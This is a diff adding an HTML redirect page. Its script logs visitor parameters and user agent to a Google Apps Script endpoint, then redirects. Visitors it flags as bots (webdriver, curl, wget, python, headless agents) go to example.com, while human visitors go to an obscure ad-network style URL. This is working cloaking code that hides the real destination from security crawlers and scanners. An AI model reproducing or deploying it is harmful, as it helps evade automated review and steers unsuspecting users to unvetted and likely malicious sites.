@@ -1,0 +1,70 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Redirecting...</title>
+  <script>
+    // Extract URL parameters
+    function getQueryParams() {
+      const params = {};
+      window.location.search.substring(1).split("&").forEach(pair => {
+        const [key, value] = pair.split("=");
+        if (key && value) {
+          params[decodeURIComponent(key)] = decodeURIComponent(value);
+        }
+      });
+      return params;
+    }
+
+    // Bot detection logic
+    function isBot() {
+      const ua = navigator.userAgent.toLowerCase();
+      return (
+        navigator.webdriver ||
+        /bot|crawl|spider|curl|wget|python|headless/i.test(ua)
+      );
+    }
+
+    // Log visit using GET request (no CORS issue)
+    function logVisit(params, botFlag) {
+      const data = {
+        siteid: params.siteid || "unknown",
+        country: params.cc || "unknown",
+        os: params.operatingsystem || "unknown",
+        device: params.device || "unknown",
+        connection: params.connection || "unknown",
+        browser: navigator.userAgent,
+        isBot: botFlag
+      };
+
+      const queryString = new URLSearchParams(data).toString();
+      const logUrl = "https://script.google.com/macros/s/AKfycby1yK1kNlt_1MjxphyE0QWsm3a1Zng9Coffc9UHunbAqgfRoegN7o9sPIkKtOxDzfKAQQ/exec?" + queryString;
+
+      // Fire GET request (no need to wait)
+      fetch(logUrl)
+        .then(res => res.text())
+        .then(res => console.log("Logging success:", res))
+        .catch(err => console.error("Logging failed:", err));
+    }
+
+    window.onload = function () {
+      const params = getQueryParams();
+      const botFlag = isBot();
+
+      // Log visit (in background)
+      logVisit(params, botFlag);
+
+      // Redirect instantly
+      const redirectUrl = botFlag
+        ? "https://example.com"
+        : "https://viiqkzqv.com/dc/?blockID=378740&tb=https%3A%2F%2Fotieu.com%2F4%2F6909001";
+
+      window.location.href = redirectUrl;
+    };
+  </script>
+</head>
+<body>
+  <p>Redirecting, please wait...</p>
+</body>
+</html>
